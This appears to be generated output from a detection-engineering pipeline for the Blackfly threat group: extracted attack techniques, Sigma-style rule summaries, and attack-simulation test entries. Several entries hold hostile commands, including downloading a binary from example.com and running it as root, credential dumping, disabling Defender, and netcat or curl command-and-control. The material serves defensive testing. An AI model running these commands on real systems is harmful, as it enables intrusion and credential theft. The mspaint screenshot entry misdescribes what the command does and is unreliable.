extracted_ttps.description: The Blackfly group used a proxy configuration tool to configure proxy settings
The Blackfly group used a credential-dumping tool to create a dump of credentials from lsass.exe in C:\\windows\\temp\\1.bin
The attacker used a proxy configuration tool to evade detection
The attacker used a backdoor to impair defenses
The Blackfly group used a process-hollowing tool to inject shellcode into C:\\Windows\\system32\\svchost.exe
The Blackfly group used a screenshotting tool to capture screenshots of all open windows
The Blackfly group used Mimikatz to dump credentials
The attacker used Mimikatz to obtain credentials from password stores
The Blackfly group used a SQL tool to query SQL databases
The attacker used a process-hollowing tool to evade detection
The Blackfly group used a rootkit driver to evade detection
The attacker used a credential-dumping tool to obtain sensitive information
Detected Process Injection activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected OS Credential Dumping activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Screen Capture activity via NLP pattern matching

rules.title: Proxy Configuration via Malicious Binary or Scheduled Task
rules.description: Detects the use of known malicious binaries associated with the Blackfly group to configure system proxy settings, including attempts via scheduled task creation. This rule covers MITRE ATT&CK T1090.002 (Internal Proxy) and T1053.005 (Scheduled Task/Job: Scheduled Task).

detection.condition: selection_hashes and selection_proxy_config or selection_hashes and selection_schtasks

falsepositives: Administrative scripts that configure proxy settings using schtasks or PowerShell for legitimate enterprise management
Software deployment tools that use scheduled tasks and modify proxy settings during setup
Signed internal tools that perform proxy configuration during network initialization

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Credential Dumping Activity Targeting LSASS
rules.description: Detects potential credential dumping activity by monitoring for processes that access lsass.exe and write dump files to temporary or application data directories. Based on observed TTPs from the Blackfly group.
falsepositives: Legitimate administrative or diagnostic tools that access lsass.exe (e.g., taskmgr.exe, procdump.exe in authorized use)
Backup software that may snapshot system processes
Antivirus or EDR tools that scan lsass for security purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Execution via Signed Binary Proxy with Known Malicious Hash
rules.description: Detects process execution using known malicious binaries associated with Signed Binary Proxy Execution technique. This rule identifies processes whose image hashes match known indicators of compromise.
falsepositives: Legitimate software using these binaries if repackaged or deployed in environment
Administrative tools or scripts executing these binaries for testing or debugging

siem_verification.message: Verification complete

rules.title: Impair Defenses via Malicious Scheduled Task Creation or Backdoor Hashes
rules.description: Detects attacker attempts to impair defenses through scheduled task creation or execution of known malicious backdoor hashes.
falsepositives: Legitimate administrative scripts creating scheduled tasks not excluded by filter
Rare cases of legitimate software matching provided hashes (unlikely given indicator specificity)

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious User Execution with Screenshot Tool and Scheduled Task Creation
rules.description: Detects execution of a known malicious screenshotting tool (Blackfly group) via user execution, including scheduled task creation activity. Matches on file hash and suspicious process creation patterns.
falsepositives: Legitimate use of schtasks.exe by system administrators for job scheduling
Users opening macro-enabled documents that spawn command-line tools for legitimate purposes
Software deployment tools using schtasks to install applications

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Mimikatz Credential Dumping Detected
rules.description: Detects execution of Mimikatz for credential dumping by known indicators including command-line artifacts and file hashes.
falsepositives: Authorized use of Mimikatz during penetration testing or red team exercises
Security researchers analyzing malware in controlled environments

siem_verification.message: Verification complete

rules.title: Credential Access via Mimikatz and Scheduled Task Creation
rules.description: Detects Mimikatz credential dumping activity and related scheduled task creation using specific indicators and behavioral patterns
falsepositives: Legitimate administrative script execution
Penetration testing activities
Security product analysis using Mimikatz

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Execution of Blackfly Group SQL Tool by Hash
rules.description: Detects the execution of a known malicious SQL tool used by the Blackfly group based on SHA-256 hash.
falsepositives: Legitimate administrative use of the binary if repurposed or if hash collision occurs (extremely unlikely)
Use of the tool in a controlled environment such as malware analysis lab

siem_verification.message: Verification complete

rules.title: Credential Dumping via Malicious Processes or Scheduled Tasks
rules.description: Detects credential dumping activity through suspicious process command lines or scheduled task creation pointing to credential access patterns.

detection.condition: (selection_cred or selection_task) and not (filter_parent or filter_user)

falsepositives: Legitimate administrative scripts using reg save for backup
Security software conducting system scans
Scheduled tasks from management tools

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Scheduled Task Creation with C2 Communication Patterns
rules.description: Detects scheduled task creation events combined with command line indicators of application layer protocol use for command and control
falsepositives: Legitimate system administration scripts that create scheduled tasks with similar parameters
Software deployment tools using encoded commands for installation

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Archive Collected Data via Command-Line Archiving Tools
rules.description: Detects potential archiving of collected data using command-line tools such as zip, rar, 7z, or PowerShell Compress-Archive. This activity is often performed before data exfiltration.
falsepositives: Legitimate backup or deployment scripts that use archiving tools
Administrative tasks involving compression of log or configuration files
Software installation routines that extract or compress files

siem_verification.message: Verification complete

rules.title: Screen Capture Activity and Scheduled Task Creation
rules.description: Detects screen capture tools execution and scheduled task creation for screen capture persistence
falsepositives: Legitimate administrative scripts
Approved screen capture software
System maintenance tasks

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

attacks.description: Set proxy settings for the current user using netsh
attacks.expected_behavior: Proxy settings will be set for the current user

attacks.description: Configure proxy settings for the system using proxycfg
attacks.expected_behavior: Proxy settings will be configured for the system

attacks.description: Set proxy settings using PowerShell
attacks.expected_behavior: Proxy settings will be set for the current PowerShell session

attacks.description: Set HTTP and HTTPS proxy environment variables
attacks.expected_behavior: Proxy settings are configured for the current shell session

attacks.command: sudo apt-get install proxychains; proxychains wget http://example.com
attacks.description: Install and use 'proxychains' to configure proxy settings
attacks.expected_behavior: Proxy settings are configured using 'proxychains', and a test connection is made

attacks.description: Configure system-wide proxy settings by modifying the /etc/environment file
attacks.expected_behavior: System-wide proxy settings are configured, requiring a reboot to take effect

attacks.description: Dump credentials from lsass.exe using procdump.exe
attacks.expected_behavior: A dump file will be created in the %TEMP% directory containing credentials

attacks.description: Dump credentials from lsass.exe using comsvcs.dll
attacks.expected_behavior: A dump file will be created in memory containing credentials

attacks.description: Dump credentials from lsass.exe using comsvcs.dll and rundll32.exe
attacks.expected_behavior: A dump file will be created in the %TEMP% directory containing credentials

attacks.description: This command attempts to find the word 'password' in any file within the /etc directory, which may contain configuration files with passwords. It requires admin privileges and is a basic example of credential dumping.
attacks.expected_behavior: The command will output lines from files in /etc that contain the word 'password', potentially revealing credential information.

attacks.description: This command uses 'getent' to access the shadow password file and grep to find the entry for the 'root' user. It's an intermediate example because it specifically targets the root user's credentials.
attacks.expected_behavior: The command will display the shadow entry for the root user, which includes the hashed password.

attacks.description: This command attempts to read the /etc/security/opasswd file, which stores old passwords for password rotation policies. It's an advanced example because it targets specific security files that might not be as commonly accessed.
attacks.expected_behavior: The command will output the contents of the opasswd file if it exists and is accessible, potentially revealing old passwords.

attacks.description: Sets up a proxy server using netsh, which could be used to evade detection by routing traffic through a controlled point.
attacks.expected_behavior: The command sets a system-wide proxy, which could alter the behavior of applications relying on internet connectivity.

attacks.description: Utilizes PowerShell to set the default web proxy, demonstrating an alternative method for configuring proxy settings that might be used to evade detection.
attacks.expected_behavior: This command changes the default web proxy setting for the current PowerShell session, which could affect how .NET applications handle web requests.

attacks.description: Modifies the registry to enable proxy settings for the current user, which could be a method to configure a system for proxy execution without being detected.
attacks.expected_behavior: Enables the use of a proxy server for internet connections by modifying the user's registry settings, which could have significant effects on system behavior and requires caution.

attacks.command: sudo curl -s https://example.com/binary > /tmp/binary; sudo chmod +x /tmp/binary; sudo /tmp/binary
attacks.description: Downloads a binary from a URL, makes it executable, and then executes it with elevated privileges.
attacks.expected_behavior: The system downloads a binary, makes it executable, and then runs it with root privileges, potentially allowing an attacker to execute arbitrary code.

attacks.description: Downloads a script from a URL and executes it using bash.
attacks.expected_behavior: The system downloads a script and executes it, potentially allowing an attacker to run arbitrary commands.

attacks.command: sudo cp /usr/bin/curl /tmp/; sudo chmod +x /tmp/curl; sudo /tmp/curl -s https://example.com/payload
attacks.description: Copies a legitimate binary to a temporary location, makes it executable (if necessary), and then uses it to download a potentially malicious payload.
attacks.expected_behavior: The system copies a legitimate binary, uses it to download a payload, potentially allowing an attacker to proxy their malicious activities through a signed binary.

attacks.description: Stop the Windows Defender service to impair defenses
attacks.expected_behavior: Windows Defender service stops, potentially impairing system defenses.

attacks.description: Disable Windows Defender using PowerShell to impair defenses
attacks.expected_behavior: Windows Defender is disabled, potentially impairing system defenses.

attacks.description: Configure the Windows Defender service to start disabled, impairing defenses
attacks.expected_behavior: Windows Defender service is configured to start disabled, potentially impairing system defenses on the next boot.

attacks.description: Disables the Uncomplicated Firewall (UFW), which could impair network defenses.
attacks.expected_behavior: The command disables the UFW, potentially exposing the system to network threats.

attacks.description: Stops the rsyslog service, which could impair logging capabilities and make it harder to detect malicious activity.
attacks.expected_behavior: The command stops the rsyslog service, potentially reducing the system's ability to log security events.

attacks.description: Disables SELinux by modifying its configuration file, which could impair mandatory access control and increase vulnerability to attacks.
attacks.expected_behavior: The command disables SELinux, potentially weakening the system's security posture.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save("$env:TEMP\screenshot.png");"
attacks.description: Capture a screenshot of the virtual screen and save it to the temp directory.
attacks.expected_behavior: A screenshot of the current desktop is saved to the temp directory.

attacks.command: powershell -Command "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $form = New-Object Windows.Forms.Form; $form.Text = 'Test Form'; $form.Size = New-Object Drawing.Size(300, 200); $form.Show(); Start-Sleep -s 2; $bounds = $form.Bounds; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save("$env:TEMP\form_screenshot.png"); $form.Close();"
attacks.description: Create a new form, show it for 2 seconds, capture its screenshot, and save it to the temp directory.
attacks.expected_behavior: A screenshot of the newly created form is saved to the temp directory after it is displayed for 2 seconds.

attacks.description: Capture the full screen and save it as a PNG to the temp directory, ensuring proper disposal of graphics resources.
attacks.expected_behavior: A full-screen screenshot is saved to the temp directory.

attacks.description: Capture a screenshot of the current window and save it to the user's home directory
attacks.expected_behavior: A screenshot of the current window will be saved to the user's home directory

attacks.description: Capture a screenshot of the entire desktop and save it to the user's home directory
attacks.expected_behavior: A screenshot of the entire desktop will be saved to the user's home directory

attacks.description: Capture a screenshot of the current window and save it to the user's home directory with a timestamped filename
attacks.expected_behavior: A screenshot of the current window will be saved to the user's home directory with a timestamped filename

attacks.description: List stored credentials using cmdkey.exe
attacks.expected_behavior: Lists stored credentials

attacks.description: Attempt to extract credentials from LSA using PowerShell
attacks.expected_behavior: Attempts to extract credentials from LSA

attacks.description: Attempt to extract credentials from the system using net.exe
attacks.expected_behavior: Attempts to extract credentials from the system

attacks.description: Attempt to find password entries in system files
attacks.expected_behavior: The command will output lines containing the word 'password' from the specified files, potentially revealing encrypted passwords or password-related information.

attacks.description: Extract user information from the passwd file
attacks.expected_behavior: This command will print the username, user ID, and home directory for each user account on the system, demonstrating how an attacker might gather preliminary information about system users.

attacks.description: Search the bash history for sudo commands containing 'password'
attacks.expected_behavior: The command will display any bash history entries that contain both 'sudo' and 'password', potentially revealing instances where a user has typed a password in conjunction with a sudo command, although this is more of a reconnaissance step rather than direct credential dumping.

attacks.description: Using Mimikatz to extract credentials from Windows Credential Manager
attacks.expected_behavior: Extracts and displays credentials stored in Windows Credential Manager

attacks.description: Simulating an attempt to access password stores via PowerShell
attacks.expected_behavior: Creates a new SecureString object, simulating an attempt to handle credentials

attacks.description: Listing stored credentials using cmdkey
attacks.expected_behavior: Lists stored credentials for the current user

attacks.description: Basic attempt to read user credentials from /etc/passwd
attacks.expected_behavior: Displays user credentials in plaintext, excluding passwords

attacks.description: Intermediate attempt to read shadow passwords
attacks.expected_behavior: Displays shadow password entries, potentially revealing encrypted passwords

attacks.description: Advanced attempt using John the Ripper to crack passwords
attacks.expected_behavior: Attempts to crack passwords using John the Ripper, potentially revealing plaintext passwords

attacks.description: Using WMIC to query local system events, demonstrating data collection from local system sources.
attacks.expected_behavior: This command queries the local system for instance operation events, which could be used to gather information about system activities.

attacks.description: Using PowerShell to retrieve the 10 newest application log entries, demonstrating collection of local system data.
attacks.expected_behavior: This command collects the 10 most recent application log entries, which can provide insights into system and application activities.

attacks.description: Using the registry query command to list startup programs, demonstrating data collection from local system configuration.
attacks.expected_behavior: This command queries the registry for startup programs, which can be used to identify applications that are set to start automatically upon system boot.

attacks.description: Basic query of a local SQLite database
attacks.expected_behavior: Retrieves data from a specified table in the SQLite database

attacks.description: Intermediate query of a local MySQL database
attacks.expected_behavior: Retrieves data from a specified table in the MySQL database using provided credentials

attacks.description: Advanced query of a local PostgreSQL database
attacks.expected_behavior: Retrieves data from a specified table in the PostgreSQL database, potentially requiring admin privileges for database access

attacks.description: Display user accounts on the system
attacks.expected_behavior: Lists all user accounts on the system

attacks.description: Extract credentials from the Windows Credential Manager using PowerShell
attacks.expected_behavior: Attempts to extract and display cached credentials

attacks.description: List stored credentials using the cmdkey.exe binary
attacks.expected_behavior: Displays a list of stored credentials on the system

attacks.description: Basic attempt to find password strings in /etc/ directory
attacks.expected_behavior: The command searches for the string 'password' in all files within the /etc/ directory, potentially revealing sensitive information.

attacks.description: Intermediate attempt to dump shadow file contents
attacks.expected_behavior: This command attempts to display the contents of the shadow file, which contains encrypted passwords, but requires appropriate permissions.

attacks.description: Advanced attempt to find password inputs in bash history
attacks.expected_behavior: The command searches the bash history for any lines containing the string 'pass' (case-insensitive), potentially revealing previously entered passwords.

attacks.description: Start the telnet service to simulate a C2 channel establishment
attacks.expected_behavior: The telnet service starts, simulating the establishment of a C2 channel.

attacks.description: Use PowerShell to execute a simple command, simulating encoded command execution
attacks.expected_behavior: The command executes, printing 'Hello, World!' to the console, demonstrating the execution of a simulated encoded command.

attacks.description: Create a file, encode it using certutil, and save the encoded file, simulating data encoding for C2 communication
attacks.expected_behavior: A file named test.txt is created in %TEMP%, encoded, and saved as encoded.txt, demonstrating the encoding of data for potential C2 communication.

attacks.description: Establish a netcat connection to a remote server for command and control.
attacks.expected_behavior: Establishes a connection to the specified server and port, allowing for potential command and control communication.

attacks.description: Use curl to send a POST request with test data to a command and control server.
attacks.expected_behavior: Sends a POST request to the specified URL with the provided test data, simulating command and control communication.

attacks.description: Download a script from a remote server and execute it, simulating a command and control payload delivery.
attacks.expected_behavior: Downloads the specified script and executes it, which could lead to the execution of malicious commands if the script is not benign.

attacks.description: Basic archiving of collected data using Compress-Archive cmdlet
attacks.expected_behavior: Creates an archive named 'archive.zip' in the temp directory containing files from the Public Documents folder

attacks.description: Intermediate example creating a directory for collected data, copying files into it, and then archiving the directory's contents
attacks.expected_behavior: Creates a directory for collected data, copies files into it, and archives these files into 'collected_data_archive.zip' in the temp directory

attacks.description: Advanced example using .NET's ZipFile class to create an archive of collected data
attacks.expected_behavior: Creates an advanced archive named 'advanced_archive.zip' in the temp directory containing files from a 'collected_data' directory, utilizing .NET's compression capabilities

attacks.description: Basic archiving of collected data using tar
attacks.expected_behavior: Creates a compressed archive of the specified data

attacks.description: Intermediate archiving using zip for collected data
attacks.expected_behavior: Creates a zip archive of the specified data

attacks.description: Advanced archiving using 7z for collected data
attacks.expected_behavior: Creates a 7z archive of the specified data

attacks.description: Captures the screen and saves it as a PNG file in the TEMP directory using PowerShell.
attacks.expected_behavior: The command captures the entire screen and saves it as a PNG file named 'screenshot.png' in the user's TEMP directory.

attacks.description: An alternative method to capture the screen, utilizing Reflection to load the necessary assembly and then saving the screenshot in the APPDATA directory.
attacks.expected_behavior: Similar to the first command, but saves the screenshot in the APPDATA directory instead.

attacks.command: powershell -Command "Start-Process mspaint -ArgumentList '/pt %TEMP%\screenshot.png'; Start-Sleep -s 5; Get-Process mspaint | Stop-Process -Force"
attacks.description: Opens MSPaint, saves a screenshot to the TEMP directory, waits 5 seconds, and then forcibly closes MSPaint.
attacks.expected_behavior: This command demonstrates an automated process of opening an application, performing an action (saving a screenshot), and then closing the application, simulating user interaction for screen capture purposes.

attacks.description: Capture the screen and save it as a PNG image file
attacks.expected_behavior: The command will capture the screen and save it as a PNG image file in the /tmp directory

attacks.description: Record the screen and save it as an MP4 video file
attacks.expected_behavior: The command will record the screen and save it as an MP4 video file in the /tmp directory

attacks.description: Capture the root window and save it as an XWD image file
attacks.expected_behavior: The command will capture the root window and save it as an XWD image file in the /tmp directory
